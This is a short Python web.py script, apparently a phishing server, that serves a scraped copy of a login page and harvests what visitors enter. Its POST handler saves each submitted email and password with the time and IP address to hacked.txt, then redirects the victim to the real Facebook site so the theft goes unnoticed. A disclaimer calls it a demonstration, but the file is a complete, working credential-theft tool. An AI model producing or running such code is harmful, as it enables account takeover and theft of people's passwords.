#!/usr/bin/env python

# This code is strictly for demonstration purposes.
# If used in any other way or for any other purposes. In no way am I responsible
# for your actions or any damage which may occur as a result of its usage
# spoofed_srv.py
# Author: Bruno Fosados - bruno.fosados at gmail dot com

from time import ctime
import web

# Here you should put the scraped web site to spoof example: index.html
render = web.template.render('templates/')

# Notice that you shoul have an /static folder inside the root (root been the folder where you are running the script)
# there you must put all .css .js and anything else like images.

# Make visible the GET request of index.html
urls = ('/', 'index')

# List to save the hacked IPs
hacked_ips = []

# Index page geted from /templates
class index:
    # When requested GET function is used to render index.html or if already hacked redirect to the real site
    def GET(self):
        if web.ctx['ip'] in hacked_ips:
            raise web.seeother('https://es-la.facebook.com/')
        else:
            return render.index()
    # When data is sended from the spoofed site it's colect it with POST function, once saved it redirect to the trusted site
    def POST(self):
        form_data = web.input()
        if form_data['email'] == '' or form_data['pass'] == '':
            return render.index()
        else:
            email = form_data['email']
            password = form_data['pass']
            hacked = open('hacked.txt', 'a')
            hacked.write("Time: %s\nIP: %s\nUser: %s\nPassword: %s\n\n" % (ctime(), web.ctx['ip'], email, password))
            hacked.close()
            hacked_ips.append(web.ctx['ip'])
            raise web.seeother('https://es-la.facebook.com/')
            # return "%s\n[*] User: %s\n[*] Password: %s\n[*] IP: %s" %(ctime(), email, password, web.ctx['ip'])

if __name__ == "__main__":
        app = web.application(urls, globals())
        app.run()
